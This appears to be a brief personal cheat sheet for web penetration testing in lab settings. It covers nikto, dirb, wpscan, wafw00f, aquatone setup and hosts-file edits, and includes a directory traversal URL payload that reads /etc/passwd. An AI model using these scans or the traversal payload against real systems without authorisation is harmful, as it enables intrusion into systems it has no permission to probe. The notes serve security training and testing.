## HTTP/HTTPS Pen Testing

### Enumeration
```
nikto -host thedomain.com

dirb http://10.11.1.140
```
---

### To add IP's to your host file
Add the following to the hosts file `10.11.1.140 domainname.com`

Linux is `/etc/hosts`

Windows is `C:\windows\system32\drivers\etc\hosts`

---

### Directory Traversal Vulnerability
```
# To attempt to view the /etc/passwd file
http://host/index.php?page=./../../../../../etc/passwd%00
```
---

### Wordpress
```
# Enumerate users on wordpress site
wpscan targetsite.com --enumerate u
```
---
### Spidering with Burpsuite
```

```
---
### Check for web firewalls with wafw00f
```
wafw00f ip
```
---
### Check if domain exists with aquatone
```
apt install chromium
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip
mv aquatone /usr/local/bin/

# Place all of your domains in a file called host
# aquatone will check if exists, and take screenshot
cat host | aquatone
```
